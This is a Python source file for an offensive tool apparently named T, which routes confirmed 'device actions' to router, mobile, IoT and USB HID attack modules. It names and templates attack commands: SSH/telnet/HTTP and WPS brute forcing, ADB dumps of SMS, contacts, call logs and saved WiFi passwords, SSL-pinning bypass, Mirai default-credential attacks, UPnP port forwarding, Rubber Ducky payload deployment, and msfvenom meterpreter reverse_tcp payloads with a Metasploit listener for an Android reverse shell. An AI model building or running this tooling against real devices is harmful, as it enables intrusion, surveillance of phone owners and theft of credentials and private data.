"""
Device exploitation orchestrator for T.
Single entry point from engine.py for all device_action messages.
Same confirmation pattern as offensive orchestrator.
"""

import asyncio
import time
from typing import TYPE_CHECKING
from core.logger import get_logger

if TYPE_CHECKING:
    from core.ws_server import Client

log = get_logger("devices.orchestrator")

_pending: dict[str, asyncio.Future] = {}

_LEGAL = "\n\n⚠ Only use against devices you own or have explicit written authorization to test."

RISK_MAP = {
    # Router
    "router_fingerprint":   ("MEDIUM",   False),
    "router_audit":         ("HIGH",     False),
    "router_autopwn":       ("HIGH",     False),
    "router_default_creds": ("HIGH",     False),
    "router_brute_http":    ("HIGH",     False),
    "router_brute_ssh":     ("HIGH",     False),
    "router_brute_telnet":  ("HIGH",     False),
    "router_snmp_enum":     ("MEDIUM",   False),
    "router_snmp_brute":    ("HIGH",     False),
    "router_config_dump":   ("MEDIUM",   False),
    "router_upnp":          ("MEDIUM",   False),
    "router_wps":           ("CRITICAL", False),
    # Mobile
    "adb_devices":          ("LOW",      False),
    "adb_fingerprint":      ("LOW",      False),
    "adb_list_packages":    ("LOW",      False),
    "adb_shell":            ("HIGH",     False),
    "adb_sms_dump":         ("HIGH",     False),
    "adb_contacts_dump":    ("HIGH",     False),
    "adb_call_log":         ("HIGH",     False),
    "adb_wifi_passwords":   ("CRITICAL", False),
    "adb_screenshot":       ("MEDIUM",   False),
    "adb_clipboard":        ("HIGH",     False),
    "adb_pull_apk":         ("MEDIUM",   False),
    "adb_install":          ("CRITICAL", False),
    "adb_backup":           ("HIGH",     False),
    "adb_connect_network":  ("HIGH",     False),
    "adb_enable_tcp":       ("HIGH",     False),
    "apk_decompile":        ("LOW",      False),
    "apk_find_secrets":     ("LOW",      False),
    "apk_permissions":      ("LOW",      False),
    "frida_list_apps":      ("LOW",      False),
    "frida_ssl_bypass":     ("HIGH",     False),
    "frida_hook_custom":    ("HIGH",     False),
    "android_payload":      ("CRITICAL", False),
    "android_listener":     ("CRITICAL", False),
    "ios_discover":         ("LOW",      False),
    "ios_backup":           ("HIGH",     False),
    "ios_ssh":              ("HIGH",     False),
    "ios_dump_ipa":         ("HIGH",     False),
    # IoT
    "iot_scan":             ("MEDIUM",   False),
    "iot_audit":            ("HIGH",     False),
    "iot_firmware_extract": ("LOW",      False),
    "iot_firmware_secrets": ("LOW",      False),
    "iot_firmware_strings": ("LOW",      False),
    "iot_mqtt_discover":    ("MEDIUM",   False),
    "iot_mqtt_publish":     ("HIGH",     False),
    "iot_coap_discover":    ("MEDIUM",   False),
    "iot_coap_get":         ("MEDIUM",   False),
    "iot_coap_put":         ("HIGH",     False),
    "iot_camera_scan":      ("MEDIUM",   False),
    "iot_camera_brute":     ("HIGH",     False),
    "iot_upnp":             ("MEDIUM",   False),
    "iot_upnp_forward":     ("CRITICAL", False),
    "iot_default_creds":    ("HIGH",     False),
    "iot_shodan":           ("LOW",      False),
    # USB HID
    "ducky_generate":       ("HIGH",     False),
    "ducky_deploy":         ("CRITICAL", False),
}


async def handle_device_action(client: "Client", msg: dict) -> None:
    action    = msg.get("action", "")
    params    = msg.get("params", {})
    action_id = msg.get("id", "")

    risk_entry = RISK_MAP.get(action, ("HIGH", False))
    risk       = risk_entry[0]

    command, description = _build_description(action, params)
    if risk == "CRITICAL":
        description += _LEGAL

    # ── Confirmation ──────────────────────────────────────────────────────────
    loop = asyncio.get_event_loop()
    fut: asyncio.Future = loop.create_future()
    _pending[action_id] = fut

    await client.send({
        "type":        "device_confirm_request",
        "id":          action_id,
        "action":      action,
        "command":     command,
        "description": description,
        "risk":        risk,
    })

    try:
        confirmed = await asyncio.wait_for(fut, timeout=60.0)
    except asyncio.TimeoutError:
        confirmed = False
    finally:
        _pending.pop(action_id, None)

    if not confirmed:
        await client.send({"type": "device_done", "id": action_id, "cancelled": True})
        return

    # ── Dispatch ──────────────────────────────────────────────────────────────
    started = time.time()
    log.info(f"device action  action={action}  params={params}")

    try:
        async for chunk in _dispatch(action, params, client, action_id):
            await client.send({
                "type":   "device_stream",
                "id":     action_id,
                "action": action,
                "chunk":  chunk,
            })

        duration = round(time.time() - started, 1)
        await client.send({"type": "device_done", "id": action_id, "action": action, "duration_s": duration})
        _log_action(action, command, 0, duration)

    except Exception as e:
        await client.send({"type": "device_error", "id": action_id, "error": str(e)})
        _log_action(action, command, -1, 0)


async def handle_device_confirm(client: "Client", msg: dict) -> None:
    action_id = msg.get("id", "")
    confirmed = bool(msg.get("confirmed", False))
    fut = _pending.pop(action_id, None)
    if fut and not fut.done():
        fut.set_result(confirmed)


# ─── ADB direct actions (no confirmation needed for read-only) ────────────────

async def handle_adb_list(client: "Client", msg: dict) -> None:
    """List ADB devices — no confirmation needed, read-only."""
    from devices.mobile import adb_devices
    try:
        devices = await adb_devices()
        await client.send({"type": "adb_devices", "devices": devices})
    except Exception as e:
        await client.send({"type": "device_error", "error": str(e)})


# ─── Dispatch ─────────────────────────────────────────────────────────────────

async def _dispatch(action: str, p: dict, client: "Client", action_id: str):
    from devices import router, mobile, iot, usb_hid

    # ── Router ────────────────────────────────────────────────────────────────
    if action == "router_fingerprint":
        async for l in router.fingerprint(p["target"]): yield l
    elif action == "router_audit":
        async for l in router.full_audit(p["target"]): yield l
    elif action == "router_autopwn":
        async for l in router.autopwn(p["target"]): yield l
    elif action == "router_default_creds":
        async for l in router.try_default_creds(p["target"], int(p.get("port", 80))): yield l
    elif action == "router_brute_http":
        async for l in router.brute_http(p["target"], int(p.get("port", 80)),
                                          p.get("user", "admin"), p.get("wordlist", "")): yield l
    elif action == "router_brute_ssh":
        async for l in router.brute_ssh(p["target"], p.get("user","root"), p.get("wordlist","")): yield l
    elif action == "router_brute_telnet":
        async for l in router.brute_telnet(p["target"], p.get("user","admin"), p.get("wordlist","")): yield l
    elif action == "router_snmp_enum":
        async for l in router.snmp_enum(p["target"], p.get("community","public")): yield l
    elif action == "router_snmp_brute":
        async for l in router.snmp_brute(p["target"]): yield l
    elif action == "router_config_dump":
        async for l in router.dump_config(p["target"]): yield l
    elif action == "router_upnp":
        async for l in router.upnp_enum(p["target"]): yield l
    elif action == "router_wps":
        async for l in router.wps_attack(p.get("interface","wlan0"), p["bssid"]): yield l

    # ── Mobile — ADB ──────────────────────────────────────────────────────────
    elif action == "adb_fingerprint":
        async for l in mobile.adb_fingerprint(p["serial"]): yield l
    elif action == "adb_list_packages":
        async for l in mobile.adb_list_packages(p["serial"]): yield l
    elif action == "adb_shell":
        async for l in mobile.adb_shell(p["serial"], p["command"]): yield l
    elif action == "adb_sms_dump":
        async for l in mobile.adb_sms_dump(p["serial"]): yield l
    elif action == "adb_contacts_dump":
        async for l in mobile.adb_contacts_dump(p["serial"]): yield l
    elif action == "adb_call_log":
        async for l in mobile.adb_call_log(p["serial"]): yield l
    elif action == "adb_wifi_passwords":
        async for l in mobile.adb_wifi_passwords(p["serial"]): yield l
    elif action == "adb_screenshot":
        async for l in mobile.adb_screenshot(p["serial"]): yield l
    elif action == "adb_clipboard":
        async for l in mobile.adb_clipboard(p["serial"]): yield l
    elif action == "adb_pull_apk":
        async for l in mobile.adb_pull_apk(p["serial"], p["package"]): yield l
    elif action == "adb_install":
        async for l in mobile.adb_install(p["serial"], p["apk_path"]): yield l
    elif action == "adb_backup":
        async for l in mobile.adb_backup(p["serial"], p["package"]): yield l
    elif action == "adb_connect_network":
        async for l in mobile.adb_connect_network(p["ip"], int(p.get("port", 5555))): yield l
    elif action == "adb_enable_tcp":
        async for l in mobile.adb_enable_tcp(p["serial"]): yield l
    elif action == "apk_decompile":
        async for l in mobile.apk_decompile(p["apk_path"]): yield l
    elif action == "apk_find_secrets":
        async for l in mobile.apk_find_secrets(p["apk_path"]): yield l
    elif action == "apk_permissions":
        async for l in mobile.apk_permissions(p["apk_path"]): yield l
    elif action == "frida_list_apps":
        async for l in mobile.frida_list_apps(p.get("device_ip","")): yield l
    elif action == "frida_ssl_bypass":
        async for l in mobile.frida_ssl_bypass(p["device_ip"], p["package"]): yield l
    elif action == "frida_hook_custom":
        async for l in mobile.frida_hook_custom(p["device_ip"], p["package"], p["script"]): yield l
    elif action == "android_payload":
        async for l in mobile.gen_android_payload(p["lhost"], p["lport"]): yield l
    elif action == "android_listener":
        async for l in mobile.start_android_listener(p["lhost"], p["lport"]): yield l
    elif action == "ios_discover":
        async for l in mobile.ios_discover(p["subnet"]): yield l
    elif action == "ios_backup":
        async for l in mobile.ios_backup(p.get("device_ip","")): yield l
    elif action == "ios_ssh":
        async for l in mobile.ios_ssh_connect(p["device_ip"]): yield l
    elif action == "ios_dump_ipa":
        async for l in mobile.ios_dump_ipa(p["device_ip"], p["bundle_id"]): yield l

    # ── IoT ───────────────────────────────────────────────────────────────────
    elif action == "iot_scan":
        async for l in iot.scan_network(p["target"]): yield l
    elif action == "iot_audit":
        async for l in iot.full_audit(p["target"]): yield l
    elif action == "iot_firmware_extract":
        async for l in iot.firmware_extract(p["firmware_path"]): yield l
    elif action == "iot_firmware_secrets":
        async for l in iot.firmware_find_secrets(p["firmware_path"]): yield l
    elif action == "iot_firmware_strings":
        async for l in iot.firmware_strings(p["firmware_path"]): yield l
    elif action == "iot_mqtt_discover":
        async for l in iot.mqtt_discover(p["broker"], int(p.get("port", 1883))): yield l
    elif action == "iot_mqtt_publish":
        async for l in iot.mqtt_publish(p["broker"], p["topic"], p["payload"]): yield l
    elif action == "iot_coap_discover":
        async for l in iot.coap_discover(p["target"]): yield l
    elif action == "iot_coap_get":
        async for l in iot.coap_get(p["target"], p["path"]): yield l
    elif action == "iot_coap_put":
        async for l in iot.coap_put(p["target"], p["path"], p["payload"]): yield l
    elif action == "iot_camera_scan":
        async for l in iot.camera_scan(p["target"]): yield l
    elif action == "iot_camera_brute":
        async for l in iot.camera_brute(p["target"]): yield l
    elif action == "iot_upnp":
        async for l in iot.upnp_discover(p["target"]): yield l
    elif action == "iot_upnp_forward":
        async for l in iot.upnp_port_forward(p["target"], int(p["ext_port"]),
                                              p["int_ip"], int(p["int_port"])): yield l
    elif action == "iot_default_creds":
        async for l in iot.iot_default_creds(p["target"]): yield l
    elif action == "iot_shodan":
        async for l in iot.shodan_iot(p["query"]): yield l

    # ── USB HID ───────────────────────────────────────────────────────────────
    elif action == "ducky_generate":
        script, desc = usb_hid.build_payload(p["payload_id"], p.get("params", {}))
        path = usb_hid.save_payload(script)
        yield f"Generated: {desc}"
        yield f"Saved to: {path}"
        yield "\n── DuckyScript ──────────────────────────────────────────"
        yield script
    elif action == "ducky_deploy":
        script, desc = usb_hid.build_payload(p["payload_id"], p.get("params", {}))
        success, msg = usb_hid.deploy_to_ducky(script)
        yield f"Payload: {desc}"
        yield msg
    else:
        yield f"[ERROR] Unknown device action: {action}"


# ─── Description builder ──────────────────────────────────────────────────────

def _build_description(action: str, p: dict) -> tuple[str, str]:
    """Return (short_command, human_description) for confirmation modal."""
    descriptions = {
        "router_fingerprint":   (f"nmap -sV {p.get('target','')}",          f"Fingerprint router at {p.get('target','')}"),
        "router_audit":         (f"routersploit + nmap + hydra",              f"Full router audit on {p.get('target','')}"),
        "router_autopwn":       (f"routersploit autopwn {p.get('target','')}",f"RouterSploit autopwn on {p.get('target','')}"),
        "router_default_creds": (f"hydra default creds {p.get('target','')}",f"Try 20+ default credentials on {p.get('target','')}"),
        "router_snmp_enum":     (f"snmpwalk {p.get('target','')}",            f"SNMP walk on {p.get('target','')} (community: {p.get('community','public')})"),
        "router_snmp_brute":    (f"onesixtyone {p.get('target','')}",         f"Brute force SNMP community strings on {p.get('target','')}"),
        "router_config_dump":   (f"curl backup endpoints {p.get('target','')}",f"Try common config backup URLs on {p.get('target','')}"),
        "router_upnp":          (f"nmap upnp-info {p.get('target','')}",      f"Enumerate UPnP services on {p.get('target','')}"),
        "router_wps":           (f"reaver -i {p.get('interface','')} -b {p.get('bssid','')}",f"WPS PIN brute force on {p.get('bssid','')}"),
        "adb_sms_dump":         ("adb shell content query sms",               "Dump all SMS messages from device"),
        "adb_contacts_dump":    ("adb shell content query contacts",          "Dump all contacts from device"),
        "adb_wifi_passwords":   ("adb shell cat wpa_supplicant.conf",         "Read saved WiFi passwords (requires root)"),
        "adb_clipboard":        ("adb shell service call clipboard",          "Read device clipboard"),
        "adb_install":          (f"adb install {p.get('apk_path','')}",       f"Install APK: {p.get('apk_path','')}"),
        "android_payload":      (f"msfvenom android/meterpreter/reverse_tcp LHOST={p.get('lhost','')} LPORT={p.get('lport','')}", "Generate Android meterpreter payload APK"),
        "android_listener":     (f"msfconsole multi/handler LHOST={p.get('lhost','')} LPORT={p.get('lport','')}", "Start Metasploit listener for Android reverse shell"),
        "frida_ssl_bypass":     (f"objection -g {p.get('package','')} sslpinning disable", f"Bypass SSL pinning in {p.get('package','')}"),
        "ios_backup":           ("idevicebackup2 backup --full",              "Extract full iOS device backup"),
        "iot_mqtt_publish":     (f"mosquitto_pub -t {p.get('topic','')} -m {p.get('payload','')}", f"Publish MQTT: {p.get('topic','')} → {p.get('payload','')}"),
        "iot_upnp_forward":     (f"upnpc -a {p.get('int_ip','')} {p.get('int_port','')} {p.get('ext_port','')} TCP", "Add UPnP port mapping"),
        "iot_default_creds":    (f"hydra Mirai-creds {p.get('target','')}",   f"Try Mirai default creds on {p.get('target','')}"),
        "ducky_deploy":         (f"Deploy {p.get('payload_id','')} to Rubber Ducky", f"Write payload to USB Rubber Ducky drive"),
    }
    entry = descriptions.get(action)
    if entry:
        return entry
    cmd  = f"{action} {' '.join(str(v) for v in p.values())}"
    desc = f"Execute: {action}"
    return cmd, desc


# ─── Action logger ────────────────────────────────────────────────────────────

def _log_action(action: str, command: str, exit_code: int, duration: float) -> None:
    try:
        import sqlite3, os, time as _t
        db_dir  = os.path.expanduser("~/.local/share/t-assistant")
        db_path = os.path.join(db_dir, "t.db")
        if not os.path.exists(db_path):
            return
        with sqlite3.connect(db_path) as conn:
            cols = {r[1] for r in conn.execute("PRAGMA table_info(security_log)")}
            for col, typ in [("tool","TEXT"),("command","TEXT"),("exit_code","INTEGER"),("duration_s","REAL")]:
                if col not in cols:
                    conn.execute(f"ALTER TABLE security_log ADD COLUMN {col} {typ}")
            conn.execute(
                "INSERT INTO security_log (timestamp, event_type, severity, source, details, tool, command, exit_code, duration_s) VALUES (?,?,?,?,?,?,?,?,?)",
                (int(_t.time()), "device", "info", action, f"Device action: {command[:200]}", action, command[:500], exit_code, duration),
            )
            conn.commit()
    except Exception as e:
        log.warning(f"device log failed: {e}")
